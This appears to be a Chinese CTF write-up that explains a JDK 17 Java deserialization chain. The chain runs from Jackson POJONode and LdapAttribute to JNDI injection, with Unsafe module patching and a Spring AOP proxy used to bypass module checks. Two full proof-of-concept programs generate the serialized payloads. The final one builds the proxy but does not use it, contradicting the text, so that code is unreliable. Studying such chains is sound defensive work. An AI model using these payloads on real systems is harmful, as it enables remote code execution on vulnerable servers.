+++
date = '2025-01-20T03:02:14+08:00'
draft = false
title = 'JDK17打Jackson+LdapAttruibute反序列化'
author='GSBP'
categories=["Java安全","WP"]

+++

## 起因

本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录

## 题目分析

题目名叫`JDBCParty`,jdk版本是17，里面给了个接口源码如下

```
    @PostMapping({"/dbtest"})
    public ResponseEntity<String> dbtest(String data) {
        try {
            User credentials = (User)Utils.deserialize(data);
            Class.forName(this.driverClassName);

            try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) {
                if (connection.isValid(5)) {
                    return ResponseEntity.ok("connect success");
                } else {
                    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body("connect failed");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body("connect failed " + e.getMessage());
        }
    }
}
```

表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。

实际入口是那个反序列化，从这个反序列化里面做文章

然后看看题目给的依赖

```
- "BOOT-INF/lib/spring-boot-3.3.5.jar"
- "BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar"
- "BOOT-INF/lib/logback-classic-1.5.11.jar"
- "BOOT-INF/lib/logback-core-1.5.11.jar"
- "BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar"
- "BOOT-INF/lib/log4j-api-2.23.1.jar"
- "BOOT-INF/lib/jul-to-slf4j-2.0.16.jar"
- "BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar"
- "BOOT-INF/lib/snakeyaml-2.2.jar"
- "BOOT-INF/lib/jackson-databind-2.17.2.jar"
- "BOOT-INF/lib/jackson-annotations-2.17.2.jar"
- "BOOT-INF/lib/jackson-core-2.17.2.jar"
- "BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar"
- "BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar"
- "BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar"
- "BOOT-INF/lib/tomcat-embed-core-10.1.31.jar"
- "BOOT-INF/lib/tomcat-embed-el-10.1.31.jar"
- "BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar"
- "BOOT-INF/lib/spring-web-6.1.14.jar"
- "BOOT-INF/lib/spring-beans-6.1.14.jar"
- "BOOT-INF/lib/micrometer-observation-1.13.6.jar"
- "BOOT-INF/lib/micrometer-commons-1.13.6.jar"
- "BOOT-INF/lib/spring-webmvc-6.1.14.jar"
- "BOOT-INF/lib/spring-aop-6.1.14.jar"
- "BOOT-INF/lib/spring-context-6.1.14.jar"
- "BOOT-INF/lib/spring-expression-6.1.14.jar"
- "BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar"
- "BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar"
- "BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar"
- "BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar"
- "BOOT-INF/lib/slf4j-api-2.0.16.jar"
- "BOOT-INF/lib/spring-core-6.1.14.jar"
- "BOOT-INF/lib/spring-jcl-6.1.14.jar"
- "BOOT-INF/lib/ojdbc11-21.14.0.0.jar"
- "BOOT-INF/lib/tomcat-jdbc-10.1.31.jar"
- "BOOT-INF/lib/tomcat-juli-10.1.31.jar"
- "BOOT-INF/lib/batik-swing-1.14.jar"
- "BOOT-INF/lib/batik-anim-1.14.jar"
- "BOOT-INF/lib/batik-parser-1.14.jar"
- "BOOT-INF/lib/batik-svg-dom-1.14.jar"
- "BOOT-INF/lib/batik-awt-util-1.14.jar"
- "BOOT-INF/lib/xmlgraphics-commons-2.6.jar"
- "BOOT-INF/lib/commons-io-1.3.1.jar"
- "BOOT-INF/lib/commons-logging-1.0.4.jar"
- "BOOT-INF/lib/batik-bridge-1.14.jar"
- "BOOT-INF/lib/batik-xml-1.14.jar"
- "BOOT-INF/lib/batik-css-1.14.jar"
- "BOOT-INF/lib/batik-dom-1.14.jar"
- "BOOT-INF/lib/xalan-2.7.2.jar"
- "BOOT-INF/lib/serializer-2.7.2.jar"
- "BOOT-INF/lib/xml-apis-1.4.01.jar"
- "BOOT-INF/lib/batik-ext-1.14.jar"
- "BOOT-INF/lib/batik-gui-util-1.14.jar"
- "BOOT-INF/lib/batik-gvt-1.14.jar"
- "BOOT-INF/lib/batik-script-1.14.jar"
- "BOOT-INF/lib/batik-shared-resources-1.14.jar"
- "BOOT-INF/lib/batik-util-1.14.jar"
- "BOOT-INF/lib/batik-constants-1.14.jar"
- "BOOT-INF/lib/batik-i18n-1.14.jar"
- "BOOT-INF/lib/xml-apis-ext-1.3.04.jar"
- "BOOT-INF/lib/fastjson2-2.0.37.jar"
- "BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar"
```

有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作

## 解

所以这里需要我们通过反序列化创造一个jndi注入

这里就想到了24年的N1junior里的Derby Plus，里面是通过CB+LdapAttribute来实现了一个JNDI注入

这里我们没有CB，但是有Fastjson2和jackson可以触发getter，在比赛的时候我写的poc如下

```
package org.example;

import cn.hutool.db.ds.DataSourceWrapper;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.POJONode;
import org.apache.commons.jexl3.JexlBuilder;
import org.apache.commons.jexl3.MapContext;
import org.h2.jdbcx.JdbcDataSource;
import org.h2.message.Trace;

import org.springframework.aop.framework.AdvisedSupport;
import sun.misc.Unsafe;

import javax.naming.CompositeName;
import javax.naming.directory.Attribute;
import javax.sql.DataSource;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.Base64;
import java.util.Vector;
import Utils.Util;

//import static org.example.Main.deserial;
//import static org.example.Main.serial;

public class test {
    public static void main(String[] args) throws Exception {
        Class<?> unSafe=Class.forName("sun.misc.Unsafe");
        Field unSafeField=unSafe.getDeclaredField("theUnsafe");
        unSafeField.setAccessible(true);
        Unsafe unSafeClass= (Unsafe) unSafeField.get(null);
        //获取基类模块
        Module baseModule=Object.class.getModule();
        Class<?> currentClass=test.class;
        //获取caller类的module field的地址
        long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module"));
        //直接将基类module的值覆盖在我们的地址上
        unSafeClass.getAndSetObject(currentClass,addr,baseModule);

        String ldapCtxUrl = "ldap://127.0.0.1:1389/";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));

        POJONode jsonNodes=new POJONode(ldapAttribute);

        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(jsonNodes);
        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});

        System.out.println(Util.serialize(list));
        deserialize(serialize(list));

    }

    public static String serialize(Object object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static void deserialize(String data) throws Exception {

        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception {
        Field f = null;
        Class<?> c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                f = c.getDeclaredField(field);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }
}

```

在反序列化的时候会触发以下报错

```
Exception in thread "main" java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method 'getAttributeSyntaxDefinition' (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not "opens com.sun.jndi.ldap" to unnamed module @19dc67c2
```

原因是在jackson反序列化的时候触发了一个模块化的机制，jdk17中的jackson在触发getter的时候，都会进行一次build

![image-20250120022959002](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022959002.png)

在build时会对property(调用的目的类和目的方法)是否public进行一次判断，如果非public则会调用setAccessible来进行一次反射调用

![image-20250120023103416](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120023103416.png)

LdapAttribute类为private类

![image-20250120023135669](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120023135669.png)

然后便触发了模块化机制，导致了报错的产生



比赛的时候脑子宕机了，后面自己思考的时候突然就想到了一个机制：`动态代理`

在平常的时候，面对jackson反序列化时大家都会在外面套一层`JdkDynamicAopProxy`的代理，目的是为了保证反序列化时触发getter的稳定性

在这里，我们的目的不是稳定性，而是通过invoke来绕过jackson反序列化DirContext类时的报错，原理如下

- 由于在外面套了一层proxy，那么jackson就只会从动态代理类触发getter
- 然后又由`JdkDynamicAopProxy`动态代理类去触发LdapAttribute的getter,因为proxy类module位于java.base，所以能够访问任意包下的类而不会触发模块化，然后成功触发JNDI注入

没套proxy时

![image-20250120022317849](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022317849.png)

套了之后

![image-20250120022402175](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022402175.png)



然后后面就是常规套路打EL或者是SnakeYaml了，这里不做太多赘述

POC

```
package org.example;

import cn.hutool.db.ds.DataSourceWrapper;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.POJONode;
import org.apache.commons.jexl3.JexlBuilder;
import org.apache.commons.jexl3.MapContext;
import org.h2.jdbcx.JdbcDataSource;
import org.h2.message.Trace;

import org.springframework.aop.framework.AdvisedSupport;
import sun.misc.Unsafe;

import javax.naming.CompositeName;
import javax.naming.directory.Attribute;
import javax.sql.DataSource;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.Base64;
import java.util.Vector;
import Utils.Util;


public class test {
    public static void main(String[] args) throws Exception {


        Class<?> unSafe=Class.forName("sun.misc.Unsafe");
        Field unSafeField=unSafe.getDeclaredField("theUnsafe");
        unSafeField.setAccessible(true);
        Unsafe unSafeClass= (Unsafe) unSafeField.get(null);
        //获取基类模块
        Module baseModule=Object.class.getModule();
        Class<?> currentClass=test.class;
        //获取caller类的module field的地址
        long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module"));
        //直接将基类module的值覆盖在我们的地址上
        unSafeClass.getAndSetObject(currentClass,addr,baseModule);

        String ldapCtxUrl = "ldap://127.0.0.1:1389/";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));

        Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class);
        System.out.println(Proxy.class.getModule());

        POJONode jsonNodes=new POJONode(ldapAttribute);

        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(jsonNodes);
        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});

        System.out.println(Util.serialize(list));
        deserialize(serialize(list));

    }
    public static Object getProxy(Object obj,Class<?> clazz) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
        return proxy;
    }
    public static String serialize(Object object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static void deserialize(String data) throws Exception {

        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception {
        Field f = null;
        Class<?> c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                f = c.getDeclaredField(field);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }
}
```

## 最后

这题除了上述方法还有很多方法，比如fastjson触发Ldap的getter，然后fastjson和jackson这俩东西也可以触发依赖里的OracleCachedRowSet的getConnection()打jndi，这里放下篇文章里说吧
